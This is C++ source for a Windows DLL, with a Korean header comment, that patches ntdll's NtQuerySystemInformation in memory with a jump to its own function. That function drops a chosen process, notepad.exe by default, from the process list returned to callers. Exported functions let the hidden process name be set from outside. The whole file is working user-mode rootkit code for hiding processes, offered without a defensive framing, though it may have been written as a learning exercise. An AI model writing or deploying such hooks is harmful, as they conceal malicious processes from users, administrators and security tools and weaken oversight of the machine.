﻿// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include "pch.h"

#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR oriProcName[MAX_PATH] = L"notepad.exe";
#pragma data_seg()

#define JMP_COMMAND_PADDING				6
#define SYSTEM_PROCESS_INFORMATION		0x05
#define STATUS_SEVERITY_SUCCESS			0x0

typedef BYTE	SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*NewQsi)(_In_ BYTE SYSTEM_INFORMATION_CLASS, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen);

void ErrorMessage(const char* msg);
void test();
void Hooking(const char* dllName, const char* srcProc, const void* buffer, int bufferSize);
NTSTATUS NewQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen);


int result = 0;

HMODULE myHandle = NULL, gNtdll = NULL;
void* gProcAddr = NULL;
wchar_t fileName[MAX_PATH] = { 0, };

BYTE* gOriBuffer = NULL, * gBuffer  = NULL;
int gOriSize = 0, gBufferSize = 0;


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	wchar_t* tempFileName = NULL;

	BYTE jmpCode[JMP_COMMAND_PADDING] = { 0xff, 0x25, 0, };
	DWORD64 offsetAddr = (DWORD64)NewQuerySystemInformation;
	int totalSize =	 gBufferSize = JMP_COMMAND_PADDING + sizeof(offsetAddr);
	gBuffer = new BYTE[totalSize];
	memcpy_s(gBuffer, JMP_COMMAND_PADDING, jmpCode, JMP_COMMAND_PADDING);
	memcpy_s(&gBuffer[JMP_COMMAND_PADDING], sizeof(DWORD64), &offsetAddr, sizeof(DWORD64));

	switch (ul_reason_for_call)
	{
		

	case DLL_PROCESS_ATTACH:
		myHandle = GetModuleHandle(NULL);
		if (myHandle == NULL) ErrorMessage("myHandle");

		result = GetModuleFileName(myHandle, fileName, MAX_PATH);
		if (result == 0) ErrorMessage("fileName");

		tempFileName = wcsrchr(fileName, '\\');
		if (tempFileName == NULL) ErrorMessage("tempFileName");
		
		result = wcscmp(tempFileName + 1, fileName);
		if (result == 0) return TRUE;

		Hooking("ntdll.dll", "NtQuerySystemInformation", gBuffer, gBufferSize);

		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void ErrorMessage(const char* msg) {
	MessageBoxA(NULL, msg, "ERROR", NULL);
	ExitProcess(1);
};

void Hooking(const char* dllName, const char* srcProc, const void* buffer, int bufferSize) {
	HMODULE dll = GetModuleHandleA(dllName);
	if (dll == NULL) ErrorMessage("dll");
	gNtdll = dll;

	void* proc = GetProcAddress(dll, srcProc);
	if (proc == NULL) ErrorMessage("proc");
	gProcAddr = proc;

	/*BYTE jmpCode[JMP_COMMAND_PADDING] = { 0xFF, 0x25, 0, };
	DWORD64 newProcAddr = 0;
	DWORD64 offsetAddr = 0;*/

	//int tmpSize = 0;
	DWORD oldProtect;

	//auto result = VirtualProtect(proc, sizeof(jmpCode) + sizeof(newProcAddr), PAGE_EXECUTE_READWRITE, &oldProtect);
	auto result = VirtualProtect(proc, bufferSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	if (!result) ErrorMessage("VirtualProtect");

	if (gOriBuffer == nullptr) {
		gOriBuffer = new BYTE[bufferSize];
		memcpy_s(gOriBuffer, bufferSize, proc, bufferSize);
		gOriSize = bufferSize;
	};
	/*tmpSize = sizeof(jmpCode);
	result = memcpy_s(proc, tmpSize, jmpCode, tmpSize);
	if (result != 0) ErrorMessage("memcpy_s");

	offsetAddr = ((DWORD64)proc + tmpSize);
	newProcAddr = (DWORD64)dstProc;
	tmpSize = sizeof(newProcAddr);
	result = memcpy_s((void*)offsetAddr, tmpSize, &newProcAddr, tmpSize);*/
	result = memcpy_s(proc, bufferSize, buffer, bufferSize);

	result = VirtualProtect(proc, bufferSize, oldProtect, &oldProtect);
	if (!result) ErrorMessage("VirtualProtect");
};

NTSTATUS NewQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS sysInfoClass, _In_ _Out_ void* sysInfo, _In_ ULONG sysInfoLen, _Out_ ULONG* retLen) {

	//MessageBoxA(NULL, "Check Function Call", "NewQsi", NULL);
	typedef struct _SYSTEM_PROCESS_INFORMATION {
		ULONG NextEntryOffset;
		ULONG NumberOfThreads;
		BYTE Reserved1[48];
		PVOID Reserved2[3];
		HANDLE UniqueProcessID;
		PVOID Reserved3;
		ULONG HandleCount;
		BYTE Reserved4[4];
		PVOID Reserved5[11];
		SIZE_T PeekPagefileUsage;
		SIZE_T PrivatePageCount;
		LARGE_INTEGER Reserved6[6];
	}SystemProcessInforMation, * PSystemPrcoessInforMation;

	NTSTATUS status;
	FARPROC pFunc;
	PSystemPrcoessInforMation pCur = NULL, pPrev = NULL;
	char procName[MAX_PATH] = { 0, };
	int result;

	Hooking("ntdll.dll", "NtQuerySystemInformation", gOriBuffer, gOriSize);
	status = ((NewQsi)gProcAddr) (sysInfoClass, sysInfo, sysInfoLen, retLen);
	if (status != STATUS_SEVERITY_SUCCESS) goto __NEWQSI_END;

	if (sysInfoClass == SYSTEM_PROCESS_INFORMATION) {
		pCur = (PSystemPrcoessInforMation)sysInfo;

		while (TRUE) {
			if (pCur->Reserved2[1] != NULL) {
				result = _wcsicmp((PWSTR)(pCur->Reserved2[1]), oriProcName);
				if (result == 0) {
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			};
			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSystemPrcoessInforMation)((ULONG64)pCur + pCur->NextEntryOffset);
		};
	};

__NEWQSI_END:
	Hooking("ntdll.dll", "ZwQuerySystemInformation", gBuffer, gBufferSize);
	return status;
};

#ifndef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(TCHAR* procName) {
		wcscpy_s(oriProcName, procName);
	};

	__declspec(dllexport) TCHAR* GetProcName() {
		return oriProcName;
	};
#ifndef __cplusplus
};
#endif
